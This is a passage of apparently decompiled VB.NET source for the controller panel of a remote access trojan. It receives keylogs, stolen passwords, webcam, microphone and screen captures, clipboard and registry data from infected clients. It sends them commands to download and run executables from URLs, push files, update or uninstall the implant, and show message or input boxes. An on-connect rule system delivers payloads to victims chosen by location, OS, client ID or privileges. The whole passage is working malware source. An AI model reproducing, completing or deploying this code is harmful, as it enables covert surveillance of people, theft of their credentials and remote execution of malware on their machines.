                        NewLateBinding.LateCall(enumerator.Current.Tag, Nothing, "Send", New Object() {New Pack().Serialize(New Object() {CByte(54), str})}, Nothing, Nothing, Nothing, True)
                    Loop
                Finally

                End Try
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub FromURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem1.Click
        Try
            Dim obj2 As Object = Me.LV_Clients.SelectedItems.Item(0)
            Dim str As String = Interaction.InputBox("Please enter a direct link to an .exe!", "ExecuteFromURL", "", -1, -1)
            If ((Not str Is Nothing) AndAlso (str.Length <> 0)) Then
                Dim enumerator As IEnumerator(Of BetterListViewItem)
                Try
                    enumerator = Me.LV_Clients.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        NewLateBinding.LateCall(enumerator.Current.Tag, Nothing, "Send", New Object() {New Pack().Serialize(New Object() {CByte(54), str})}, Nothing, Nothing, Nothing, True)
                    Loop
                Finally

                End Try
            End If
        Catch exception1 As Exception

        End Try
    End Sub
    Public Function Generate() As String
        Dim num2 As Integer
        Dim strArray As String() = New String() {"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}
        Dim str As String = Nothing
        Dim num As Integer = 0
        Do
            str = (str & strArray(CInt(Math.Round(CDbl((VBMath.Rnd * 61.0!))))))
            num += 1
            num2 = 15
        Loop While (num <= num2)
        Return str
    End Function

    Private Function GetBetween(ByVal input As String, ByVal str1 As String, ByVal str2 As String, ByVal index As Integer) As String
        Dim str3 As String = Regex.Split(input, str1)((index + 1))
        Return Regex.Split(str3, str2)(0)
    End Function

    Private Sub GetCP(ByVal txt As String)
        My.Forms.SysManager.rtb_clipboard.Text = txt
    End Sub

    Private Function GetTime() As String
        Return Conversions.ToString(DateAndTime.TimeOfDay)
    End Function

    Private Sub Graph_Receive_ValueAdded()
        If (Information.UBound(Me.Graph_Receive.Values, 1) = &H19) Then
            Dim values As Single() = Me.Graph_Receive.Values
            Dim num2 As Integer = Information.UBound(values, 1)
            Dim i As Integer = 2
            Do While (i <= num2)
                values((i - 1)) = values(i)
                i += 1
            Loop
            values = DirectCast(Utils.CopyArray(DirectCast(values, Array), New Single(((Information.UBound(values, 1) - 1) + 1) - 1) {}), Single())
            Me.Graph_Receive.Clear()
            Me.Graph_Receive.AddValues(values)
        End If
    End Sub

    Private Sub Graph_Sent_ValueAdded()
        If (Information.UBound(Me.Graph_Sent.Values, 1) = &H19) Then
            Dim values As Single() = Me.Graph_Sent.Values
            Dim num2 As Integer = Information.UBound(values, 1)
            Dim i As Integer = 2
            Do While (i <= num2)
                values((i - 1)) = values(i)
                i += 1
            Loop
            values = DirectCast(Utils.CopyArray(DirectCast(values, Array), New Single(((Information.UBound(values, 1) - 1) + 1) - 1) {}), Single())
            Me.Graph_Sent.Clear()
            Me.Graph_Sent.AddValues(values)
        End If
    End Sub

    Public Sub HandleDroppedFiles(ByVal file As String)
        If (Strings.Len(file) > 0) Then
            Me.LoadPicture(file)
        End If
    End Sub

    Private Sub HandleInputBox(ByVal answer As String, ByVal client As ServerClient)
        If ((answer.Length = 0) OrElse (answer Is Nothing)) Then
            Me.AddStatus("{0} has closed or aborted the InputBox", New Object() {client.EndPoint.Address.ToString})
        Else
            Me.AddStatus("{0} responded to your InputBox with: {1}", New Object() {client.EndPoint.Address.ToString, answer})
        End If
    End Sub

    Private Sub HandleMicrophone(ByVal byt As Byte())
        My.Forms.Microphone.HandleRecording(byt)
    End Sub

    Private Sub HandleOnConnect(ByVal location As String, ByVal id As String, ByVal os As String, ByVal privs As String, ByVal client As ServerClient)
        Try
            If (Me.LV_OnConnect.Items.Count <> 0) Then
                Dim item As BetterListViewItem
                For Each item In Me.LV_OnConnect.Items
                    Select Case item.Text
                        Case "Execute File from URL"
                            If (item.SubItems.Item(2).Text = "All") Then
                                client.Send(New Pack().Serialize(New Object() {CByte(54), item.SubItems.Item(1).Text}))
                            ElseIf item.SubItems.Item(2).Text.Contains("Location:") Then
                                Dim str As String = item.SubItems.Item(2).Text.Replace("Location: ", "")
                                If (location = str) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(54), item.SubItems.Item(1).Text}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("ClientID:") Then
                                If (item.SubItems.Item(2).Text.Replace("ClientID: ", "") = id) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(54), item.SubItems.Item(1).Text}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("OS:") Then
                                Dim str3 As String = item.SubItems.Item(2).Text.Replace("OS: ", "")
                                If os.Contains(str3) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(54), item.SubItems.Item(1).Text}))
                                End If
                            ElseIf (item.SubItems.Item(2).Text.Contains("Privilegs:") AndAlso (item.SubItems.Item(2).Text.Replace("Privilegs: ", "") = privs)) Then
                                client.Send(New Pack().Serialize(New Object() {CByte(54), item.SubItems.Item(1).Text}))
                            End If
                            Exit Select
                        Case "Execute File"
                            If (item.SubItems.Item(2).Text = "All") Then
                                client.Send(New Pack().Serialize(New Object() {CByte(55), File.ReadAllBytes(item.SubItems.Item(1).Text)}))
                            ElseIf item.SubItems.Item(2).Text.Contains("Location:") Then
                                Dim str5 As String = item.SubItems.Item(2).Text.Replace("Location: ", "")
                                If (location = str5) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(55), File.ReadAllBytes(item.SubItems.Item(1).Text)}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("ClientID:") Then
                                If (item.SubItems.Item(2).Text.Replace("ClientID: ", "") = id) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(55), File.ReadAllBytes(item.SubItems.Item(1).Text)}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("OS:") Then
                                Dim str7 As String = item.SubItems.Item(2).Text.Replace("OS: ", "")
                                If os.Contains(str7) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(55), File.ReadAllBytes(item.SubItems.Item(1).Text)}))
                                End If
                            ElseIf (item.SubItems.Item(2).Text.Contains("Privilegs:") AndAlso (item.SubItems.Item(2).Text.Replace("Privilegs: ", "") = privs)) Then
                                client.Send(New Pack().Serialize(New Object() {CByte(55), File.ReadAllBytes(item.SubItems.Item(1).Text)}))
                            End If
                            Exit Select
                        Case "Update Server from URL"
                            If (item.SubItems.Item(2).Text = "All") Then
                                client.Send(New Pack().Serialize(New Object() {CByte(57), item.SubItems.Item(1).Text}))
                            ElseIf item.SubItems.Item(2).Text.Contains("Location:") Then
                                Dim str9 As String = item.SubItems.Item(2).Text.Replace("Location: ", "")
                                If (location = str9) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(57), item.SubItems.Item(1).Text}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("ClientID:") Then
                                If (item.SubItems.Item(2).Text.Replace("ClientID: ", "") = id) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(57), item.SubItems.Item(1).Text}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("OS:") Then
                                Dim str11 As String = item.SubItems.Item(2).Text.Replace("OS: ", "")
                                If os.Contains(str11) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(57), item.SubItems.Item(1).Text}))
                                End If
                            ElseIf (item.SubItems.Item(2).Text.Contains("Privilegs:") AndAlso (item.SubItems.Item(2).Text.Replace("Privilegs: ", "") = privs)) Then
                                client.Send(New Pack().Serialize(New Object() {CByte(57), item.SubItems.Item(1).Text}))
                            End If
                            Exit Select
                        Case "Update Server from File"
                            If (item.SubItems.Item(2).Text = "All") Then
                                client.Send(New Pack().Serialize(New Object() {CByte(58), File.ReadAllBytes(item.SubItems.Item(1).Text)}))
                            ElseIf item.SubItems.Item(2).Text.Contains("Location:") Then
                                Dim str13 As String = item.SubItems.Item(2).Text.Replace("Location: ", "")
                                If (location = str13) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(58), File.ReadAllBytes(item.SubItems.Item(1).Text)}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("ClientID:") Then
                                If (item.SubItems.Item(2).Text.Replace("ClientID: ", "") = id) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(58), File.ReadAllBytes(item.SubItems.Item(1).Text)}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("OS:") Then
                                Dim str15 As String = item.SubItems.Item(2).Text.Replace("OS: ", "")
                                If os.Contains(str15) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(58), File.ReadAllBytes(item.SubItems.Item(1).Text)}))
                                End If
                            ElseIf (item.SubItems.Item(2).Text.Contains("Privilegs:") AndAlso (item.SubItems.Item(2).Text.Replace("Privilegs: ", "") = privs)) Then
                                client.Send(New Pack().Serialize(New Object() {CByte(58), File.ReadAllBytes(item.SubItems.Item(1).Text)}))
                            End If
                            Exit Select
                        Case "InputBox"
                            Dim str17 As String = Me.GetBetween(item.SubItems.Item(1).Text, "Question: ", " Title:", 0)
                            Dim str18 As String = item.SubItems.Item(1).Text.Remove(0, (item.SubItems.Item(1).Text.LastIndexOf("Title: ") + "Title: ".Length))
                            If (item.SubItems.Item(2).Text = "All") Then
                                client.Send(New Pack().Serialize(New Object() {CByte(59), str17, str18}))
                            ElseIf item.SubItems.Item(2).Text.Contains("Location:") Then
                                Dim str19 As String = item.SubItems.Item(2).Text.Replace("Location: ", "")
                                If (location = str19) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(59), str17, str18}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("ClientID:") Then
                                If (item.SubItems.Item(2).Text.Replace("ClientID: ", "") = id) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(59), str17, str18}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("OS:") Then
                                Dim str21 As String = item.SubItems.Item(2).Text.Replace("OS: ", "")
                                If os.Contains(str21) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(59), str17, str18}))
                                End If
                            ElseIf (item.SubItems.Item(2).Text.Contains("Privilegs:") AndAlso (item.SubItems.Item(2).Text.Replace("Privilegs: ", "") = privs)) Then
                                client.Send(New Pack().Serialize(New Object() {CByte(59), str17, str18}))
                            End If
                            Exit Select
                        Case "MessageBox"
                            If (item.SubItems.Item(2).Text = "All") Then
                                client.Send(New Pack().Serialize(New Object() {CByte(60), RuntimeHelpers.GetObjectValue(item.SubItems.Item(1).Tag)}))
                            ElseIf item.SubItems.Item(2).Text.Contains("Location:") Then
                                Dim str23 As String = item.SubItems.Item(2).Text.Replace("Location: ", "")
                                If (location = str23) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(60), RuntimeHelpers.GetObjectValue(item.SubItems.Item(1).Tag)}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("ClientID:") Then
                                If (item.SubItems.Item(2).Text.Replace("ClientID: ", "") = id) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(60), RuntimeHelpers.GetObjectValue(item.SubItems.Item(1).Tag)}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("OS:") Then
                                Dim str25 As String = item.SubItems.Item(2).Text.Replace("OS: ", "")
                                If os.Contains(str25) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(60), RuntimeHelpers.GetObjectValue(item.SubItems.Item(1).Tag)}))
                                End If
                            ElseIf (item.SubItems.Item(2).Text.Contains("Privilegs:") AndAlso (item.SubItems.Item(2).Text.Replace("Privilegs: ", "") = privs)) Then
                                client.Send(New Pack().Serialize(New Object() {CByte(60), RuntimeHelpers.GetObjectValue(item.SubItems.Item(1).Tag)}))
                            End If
                            Exit Select
                        Case "Disconnect"
                            If (item.SubItems.Item(2).Text = "All") Then
                                client.Send(New Pack().Serialize(New Object() {CByte(&H34)}))
                            ElseIf item.SubItems.Item(2).Text.Contains("Location:") Then
                                Dim str27 As String = item.SubItems.Item(2).Text.Replace("Location: ", "")
                                If (location = str27) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(&H34)}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("ClientID:") Then
                                If (item.SubItems.Item(2).Text.Replace("ClientID: ", "") = id) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(&H34)}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("OS:") Then
                                Dim str29 As String = item.SubItems.Item(2).Text.Replace("OS: ", "")
                                If os.Contains(str29) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(&H34)}))
                                End If
                            ElseIf (item.SubItems.Item(2).Text.Contains("Privilegs:") AndAlso (item.SubItems.Item(2).Text.Replace("Privilegs: ", "") = privs)) Then
                                client.Send(New Pack().Serialize(New Object() {CByte(&H34)}))
                            End If
                            Exit Select
                        Case "Uninstall"
                            If (item.SubItems.Item(2).Text = "All") Then
                                client.Send(New Pack().Serialize(New Object() {CByte(&H35)}))
                            ElseIf item.SubItems.Item(2).Text.Contains("Location:") Then
                                Dim str31 As String = item.SubItems.Item(2).Text.Replace("Location: ", "")
                                If (location = str31) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(&H35)}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("ClientID:") Then
                                If (item.SubItems.Item(2).Text.Replace("ClientID: ", "") = id) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(&H35)}))
                                End If
                            ElseIf item.SubItems.Item(2).Text.Contains("OS:") Then
                                Dim str33 As String = item.SubItems.Item(2).Text.Replace("OS: ", "")
                                If os.Contains(str33) Then
                                    client.Send(New Pack().Serialize(New Object() {CByte(&H35)}))
                                End If
                            ElseIf (item.SubItems.Item(2).Text.Contains("Privilegs:") AndAlso (item.SubItems.Item(2).Text.Replace("Privilegs: ", "") = privs)) Then
                                client.Send(New Pack().Serialize(New Object() {CByte(&H35)}))
                            End If
                            Exit Select
                    End Select
                Next
                GC.Collect()
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub HandleProcess(ByVal args As String)
        Me.Invoke(New Delegate_HandleProcess(AddressOf Me._HandleProcess), New Object() {args})
    End Sub

    Private Sub InputBoxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InputBoxToolStripMenuItem.Click
        Try
            Dim obj2 As Object = Me.LV_Clients.SelectedItems.Item(0)
            Dim str As String = Interaction.InputBox("Please enter what you want to ask the client!", "InputBox", "", -1, -1)
            If ((Not str Is Nothing) AndAlso (str.Length <> 0)) Then
                Dim str2 As String = Interaction.InputBox("Please enter a title that shall be displayed on the InputBox!", "InputBox", "", -1, -1)
                If ((Not str2 Is Nothing) AndAlso (str2.Length <> 0)) Then
                    Dim enumerator As IEnumerator(Of BetterListViewItem)
                    Try
                        enumerator = Me.LV_Clients.SelectedItems.GetEnumerator
                        Do While enumerator.MoveNext
                            NewLateBinding.LateCall(enumerator.Current.Tag, Nothing, "Send", New Object() {New Pack().Serialize(New Object() {CByte(59), str, str2})}, Nothing, Nothing, Nothing, True)
                        Loop
                    Finally

                    End Try
                End If
            End If
        Catch exception1 As Exception

        End Try
    End Sub
    Private Sub InputBx(ByVal actionfor As String)
        Dim str As String = Interaction.InputBox("Please enter what you want to ask the client!", "InputBox", "", -1, -1)
        If ((Not str Is Nothing) AndAlso (str.Length <> 0)) Then
            Dim str2 As String = Interaction.InputBox("Please enter a title that shall be displayed on the InputBox!", "InputBox", "", -1, -1)
            If ((Not str2 Is Nothing) AndAlso (str2.Length <> 0)) Then
                Dim item As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 4)
                item.SubItems.Add(String.Format("Question: {0} Title: {1}", str, str2))
                item.SubItems.Add(actionfor)
                item = Nothing
            End If
        End If
    End Sub

    Private Sub listener_ClientExceptionThrown(ByVal sender As ServerListener, ByVal client As ServerClient, ByVal ex As Exception)
        Me.AddStatus("{0} has thrown {1}", New Object() {client.EndPoint.Address, ex.Message})
    End Sub

    Private Sub listener_ClientReadPacket(ByVal sender As ServerListener, ByVal client As ServerClient, ByVal data As Byte())
        Dim objArray As Object() = Me.packer.Deserialize(data)
        If ((Not objArray Is Nothing) AndAlso (objArray.Length <> 0)) Then
            Select Case CByte(DirectCast(objArray(0), PacketHeaders))
                Case 0
                    Me.AddClient(CStr(objArray(1)), CStr(objArray(2)), CStr(objArray(3)), CStr(objArray(4)), CStr(objArray(5)), CStr(objArray(6)), CStr(objArray(7)), CStr(objArray(8)), CStr(objArray(9)), CStr(objArray(10)), client)
                    Exit Select
                Case 1
                    Me.AddRemoteDesktopImage(DirectCast(objArray(1), Byte()))
                    Exit Select
                Case 2
                    Me.Invoke(New DelegateAddMonitorCount(AddressOf Me.AddMonitorCount), New Object() {CInt(objArray(1))})
                    Exit Select
                Case 4
                    Me.Invoke(New DelegateAddPCBounds(AddressOf Me.AddPCBounds), New Object() {CInt(objArray(1)), CInt(objArray(2))})
                    Exit Select
                Case 6
                    Me.Invoke(New DelegateAddDrives(AddressOf Me.AddDrives), New Object() {CStr(objArray(1))})
                    Exit Select
                Case 7
                    Me.Invoke(New DelegateAddFiles(AddressOf Me.AddFiles), New Object() {CStr(objArray(1))})
                    Exit Select
                Case 8
                    Me.Invoke(New DelegateAddException(AddressOf Me.AddException), New Object() {CStr(objArray(1)), CStr(objArray(2))})
                    Exit Select
                Case 9
                    Me.DownloadFile(CStr(objArray(1)), client, DirectCast(objArray(2), Byte()))
                    Exit Select
                Case 21
                    Me.Invoke(New DelegateThumbnailPreview(AddressOf Me.ThumbnailPreview), New Object() {DirectCast(objArray(1), Byte()), CStr(objArray(2))})
                    Exit Select
                Case 23
                    Me.Invoke(New DelegateAddkeylogs(AddressOf Me.Addkeylogs), New Object() {CStr(objArray(1))})
                    Exit Select
                Case 26
                    Me.Invoke(New DelegateHandleMicrophone(AddressOf Me.HandleMicrophone), New Object() {DirectCast(objArray(1), Byte())})
                    Exit Select
                Case 27
                    Me.Invoke(New DelegateAddSysManagerInfo(AddressOf Me.AddSysManagerInfo), New Object() {CStr(objArray(1)), CStr(objArray(2)), CStr(objArray(3)), CStr(objArray(4)), CStr(objArray(5)), CStr(objArray(6)), CStr(objArray(7)), CStr(objArray(8)), CStr(objArray(9)), CStr(objArray(10)), CStr(objArray(11)), CStr(objArray(12)), CStr(objArray(13)), CStr(objArray(14)), CStr(objArray(15)), CStr(objArray(&H10)), CStr(objArray(&H11)), CStr(objArray(&H12)), CStr(objArray(&H13)), CStr(objArray(20)), CStr(objArray(21)), CStr(objArray(&H16)), client})
                    Exit Select
                Case 28
                    Me.TR_Process = New Thread(New ParameterizedThreadStart(AddressOf Me.lam__5))
                    Me.TR_Process.Start(CStr(objArray(1)))
                    Exit Select
                Case 31
                    Me.TR_Software = New Thread(New ParameterizedThreadStart(AddressOf Me.lam__6))
                    Me.TR_Software.Start(CStr(objArray(1)))
                    Exit Select
                Case 33
                    Me.TR_Connection = New Thread(New ParameterizedThreadStart(AddressOf Me.lam__7))
                    Me.TR_Connection.Start(CStr(objArray(1)))
                    Exit Select
                Case 34
                    Me.Invoke(New DelegateAddStartup(AddressOf Me.AddStartup), New Object() {CStr(objArray(1))})
                    Exit Select
                Case 36
                    Me.TR_Service = New Thread(New ParameterizedThreadStart(AddressOf Me.lam__8))
                    Me.TR_Service.Start(CStr(objArray(1)))
                    Exit Select
                Case 46
                    Me.Invoke(New DelegateAddCMD(AddressOf Me.AddCMD), New Object() {CStr(objArray(1))})
                    Exit Select
                Case 47
                    Me.Invoke(New DelegateGetCP(AddressOf Me.GetCP), New Object() {CStr(objArray(1))})
                    Exit Select
                Case 49
                    Me.Invoke(New DelegateAddHostsFile(AddressOf Me.AddHostsFile), New Object() {CStr(objArray(1))})
                    Exit Select
                Case 51
                    Me.Invoke(New DelegateAddPasswords(AddressOf Me.AddPasswords), New Object() {CStr(objArray(1)), client})
                    Exit Select
                Case 56
                    Me.AddStatus(String.Format("{0} : {1}", client.EndPoint.Address.ToString, CStr(objArray(1))), New Object(0 - 1) {})
                    Exit Select
                Case 59
                    Me.HandleInputBox(CStr(objArray(1)), client)
                    Exit Select
                Case 65
                    Me.Invoke(New DelegateAddChatMessage(AddressOf Me.AddChatMessage), New Object() {CStr(objArray(1)), client})
                    Exit Select
                Case 107
                    Me.Invoke(New DelegateAddScreenshot(AddressOf Me.AddScreenshot), New Object() {DirectCast(objArray(1), Byte())})
                    Exit Select
                Case 108
                    Me.Invoke(New DelegateAddMonitorCount2(AddressOf Me.AddMonitorCount2), New Object() {CInt(objArray(1))})
                    Exit Select
                Case 110
                    Me.TR_Window = New Thread(New ParameterizedThreadStart(AddressOf Me.lam__9))
                    Me.TR_Window.Start(CStr(objArray(1)))
                    Exit Select
                Case 121
                    Me.AddWebcam(DirectCast(objArray(1), Byte()))
                    Exit Select
                Case 122
                    Me.Invoke(New DelegateAddWebcamDevices(AddressOf Me.AddWebcamDevices), New Object() {CStr(objArray(1))})
                    Exit Select
                Case 123
                    Me.Invoke(New DelegateAddRegistryKeys(AddressOf Me.AddRegistryKeys), New Object() {CStr(objArray(1))})
                    Exit Select
                Case 124
                    Me.Invoke(New DelegateAddRegistryValues(AddressOf Me.AddRegistryValues), New Object() {CStr(objArray(1))})
                    Exit Select
                Case 131
                    Me.Invoke(New DelegateAddWebcamThumbNail(AddressOf Me.AddThumbNailWebCam), New Object() {client, DirectCast(objArray(1), Byte())})
                    Exit Select
                Case 132
                    Me.Invoke(New DelegateAddDesktopThumbNail(AddressOf Me.AddThumbNailDesktop), New Object() {client, DirectCast(objArray(1), Byte())})
                    Exit Select
            End Select
        End If
    End Sub

    Private Sub listener_ClientStateChanged(ByVal sender As ServerListener, ByVal client As ServerClient, ByVal connected As Boolean)
        Try
            If connected Then
                Me.AddStatus("New Connection from {0}!", New Object() {client.EndPoint.Address})
            Else
                Me.AddStatus("{0} has disconnected!", New Object() {client.EndPoint.Address})
                Me.RemoveClient(client)
            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub listener_ExceptionThrown(ByVal sender As ServerListener, ByVal ex As Exception)
        Me.AddStatus("Exception: {0}", New Object() {ex.Message})
    End Sub

    Private Sub listener_StateChanged(ByVal sender As ServerListener, ByVal listening As Boolean)
        Me.AddStatus("Listening: {0}", New Object() {listening})
    End Sub

    Public Function LoadPicture(ByVal File As String) As Boolean
        Dim flag As Boolean
        Dim info As New FileInfo(File)
        If (info.Extension <> ".ico") Then
            MessageBox.Show("Please select a valid Icon (*.ico)", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            Return flag
        End If
        Me.PictureBox1.ImageLocation = File
        Me.PictureBox1.Tag = File
        Return flag
    End Function

    Private Sub LocationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LocationToolStripMenuItem.Click
        Try
            Me.LV_Clients.Groups.Clear()
            If Not Me.called(0) Then
                Dim list As New ArrayList
                Dim item As BetterListViewItem
                For Each item In Me.LV_Clients.Items
                    If Not list.Contains(item.Text) Then
                        list.Add(item.Text)
                    End If
                Next
                Dim num As Integer = (list.Count - 1)
                Dim groupArray As BetterListViewGroup() = New BetterListViewGroup((num + 1) - 1) {}
                Dim num4 As Integer = num
                Dim i As Integer = 0
                Do While (i <= num4)
                    groupArray(i) = New BetterListViewGroup(Conversions.ToString(list.Item(i)))
                    groupArray(i).Font = (New Font("Verdana", 10.0!))
                    i += 1
                Loop
                Dim item2 As BetterListViewItem
                For Each item2 In Me.LV_Clients.Items
                    Dim num5 As Integer = num
                    Dim j As Integer = 0
                    Do While (j <= num5)
                        If (groupArray(j).Header = item2.Text) Then
                            groupArray(j).Image = (Me.IL_CountryFlags.Images.Item(item2.ImageIndex))
                            item2.Group = (groupArray(j))
                            Me.LV_Clients.Groups.Add(groupArray(j))
                            Me.LV_Clients.Items.Add(item2)
                        End If
                        j += 1
                    Loop
                Next
                Me.LV_Clients.ShowGroups = (True)
                Me.called(0) = True
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub LV_News_SelectedIndexChanged(sender As Object, e As EventArgs) Handles LV_News.SelectedIndexChanged
        Try
            If (Me.LV_News.SelectedIndices.Count <> 0) Then
                Me.rtb_news.Clear()
                Me.ID = CInt(Me.LV_News.SelectedItems.Item(0).Tag)
                Me.retrieve = New Thread(New ThreadStart(AddressOf Me.RetrieveNews))
                Me.retrieve.Start()
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub LV_Ports_AfterLabelEdit(sender As Object, eventArgs As BetterListViewLabelEditEventArgs)
        Try
            If (Not Versioned.IsNumeric(Me.LV_Ports.Items.Item(0).Text) Or (Conversions.ToDouble(Me.LV_Ports.Items.Item(0).Text) >= 65535)) Then
                Me.LV_Ports.Items.Item(0).Text = ("4431")
            Else
                My.Settings.port = Conversions.ToInteger(Me.LV_Ports.Items.Item(0).Text)
                My.Settings.Save()
            End If
        Catch exception1 As Exception
            Me.LV_Ports.Items.Item(0).Text = ("4431")
        End Try
    End Sub

    Private Sub LV_Ports_BeforeLabelEdit(sender As Object, eventArgs As BetterListViewLabelEditCancelEventArgs)
        If Not Me.btn_startlistening.Enabled Then
            Me.LV_Ports.LabelEdit = (False)
        Else
            Me.LV_Ports.LabelEdit = (True)
        End If
    End Sub

    Private Sub SystemManagersToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SystemManagersToolStripMenuItem.Click
        Try
            My.Forms.SysManager.client = DirectCast(Me.LV_Clients.SelectedItems.Item(0).Tag, ServerClient)
            My.Forms.SysManager.Text = ("System Managers - " & NewLateBinding.LateGet(NewLateBinding.LateGet(Me.LV_Clients.SelectedItems.Item(0).Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
            My.Forms.SysManager.Show()
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub MapViewToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MapViewToolStripMenuItem.Click
        Try
            Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.LV_Clients.SelectedItems.Item(0).Tag)
            If (Me.LV_Clients.SelectedItems.Count = 1) Then
                My.Forms.MapView.Text = ("Map View - " & NewLateBinding.LateGet(NewLateBinding.LateGet(Me.LV_Clients.SelectedItems.Item(0).Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
                My.Forms.MapView.ip.Add(NewLateBinding.LateGet(NewLateBinding.LateGet(Me.LV_Clients.SelectedItems.Item(0).Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
                My.Forms.MapView.Show()
            Else
                My.Forms.MapView.Text = "Map View"
                Dim item As BetterListViewItem
                For Each item In Me.LV_Clients.SelectedItems
                    My.Forms.MapView.ip.Add(NewLateBinding.LateGet(NewLateBinding.LateGet(item.Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
                Next
                My.Forms.MapView.Show()
            End If
        Catch exception1 As Exception

        End Try
    End Sub
    Private Sub messageboxresult_TextChanged(ByVal sender As Object, ByVal e As EventArgs)
        Try
            Dim enumerator As IEnumerator(Of BetterListViewItem)
            Try
                enumerator = Me.LV_Clients.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    NewLateBinding.LateCall(enumerator.Current.Tag, Nothing, "Send", New Object() {New Pack().Serialize(New Object() {CByte(60), Me.messageboxresult.Text})}, Nothing, Nothing, Nothing, True)
                Loop
            Finally

            End Try
        Catch exception1 As Exception

        End Try
    End Sub
    Private Sub MessageBoxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MessageBoxToolStripMenuItem.Click
        Try
            Dim obj2 As Object = Me.LV_Clients.SelectedItems.Item(0)
            My.Forms.SendMessageBox.Show()
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub MicrophoneToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MicrophoneToolStripMenuItem.Click
        Try
            My.Forms.Microphone.client = DirectCast(Me.LV_Clients.SelectedItems.Item(0).Tag, ServerClient)
            My.Forms.Microphone.Text = ("Microphone - " & NewLateBinding.LateGet(NewLateBinding.LateGet(Me.LV_Clients.SelectedItems.Item(0).Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
            My.Forms.Microphone.Show()
        Catch exception1 As Exception

        End Try
    End Sub
    Private Sub msbox(ByVal actionfor As String)
        My.Forms.SendMessageBox.actionfor = actionfor
        My.Forms.SendMessageBox.onconnect = True
        My.Forms.SendMessageBox.Show()
    End Sub

    Private Sub OperatingSystemToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OperatingSystemToolStripMenuItem.Click
        Try
            Me.LV_Clients.Groups.Clear()
            If Not Me.called(2) Then
                Dim list As New ArrayList
                Dim item As BetterListViewItem
                For Each item In Me.LV_Clients.Items
                    If Not list.Contains(item.SubItems.Item(6).Text) Then
                        list.Add(item.SubItems.Item(6).Text)
                    End If
                Next
                Dim num As Integer = (list.Count - 1)
                Dim groupArray As BetterListViewGroup() = New BetterListViewGroup((num + 1) - 1) {}
                Dim num4 As Integer = num
                Dim i As Integer = 0
                Do While (i <= num4)
